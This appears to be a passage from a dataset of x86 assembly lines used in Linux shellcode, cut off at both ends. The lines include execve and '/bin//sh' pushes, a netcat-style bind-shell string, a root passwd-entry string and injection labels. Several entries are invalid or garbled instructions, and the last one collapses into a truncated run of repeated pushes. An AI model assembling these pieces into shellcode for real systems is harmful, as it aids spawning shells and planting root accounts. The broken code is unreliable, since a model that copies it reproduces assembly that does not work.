  "notdecode:",
  "jmp read",
  "push word 0x776f",
  "push ' -le///sh//sh'",
  "child:",
  "mov edx, response",
  "cmp DWORD [eax], edi \\n jne l1",
  "mov esi, 0x353ffc3b",
  "ip equ 0x0100007f",
  "lea edx, [ebx+12]",
  "mov esi, word [esi]",
  "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
  "add edx, 32",
  "xor eax, eax \\n xor ebx, ebx \\n xor ecx, ecx \\n xor edx, edx",
  "mov dl, byte [esi+1]",
  "push __nr_execve \\n pop eax",
  "mov eax, value -1 \\n not eax",
  "mov bl, 3 \\n dec bl \\n jnz l3",
  "jmp shellcode",
  "push byte 0x8 \\n pop 0x8",
  "shr bl, 4",
  "push 0x746f6f72",
  "xor eax, eax \\n mov numebr, esp",
  "jge exi",
  "mov ecx, 0x1",
  "mov eax, [ebx+esi*2+4]",
  "_start: \\n jmp short call_shellcode",
  "mov edx, 0x65676760",
  "xor ecx, ecx",
  "dec eax",
  "_file_label:",
  "int 80h",
  "push dword 0x3a303a3a",
  "cmp al, 2 \\n jne do_inject",
  "mov mm3, \"shellcode\"",
  "jne exit",
  "mov byte [edi], bl",
  "xchg edi, eax",
  "push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x"
]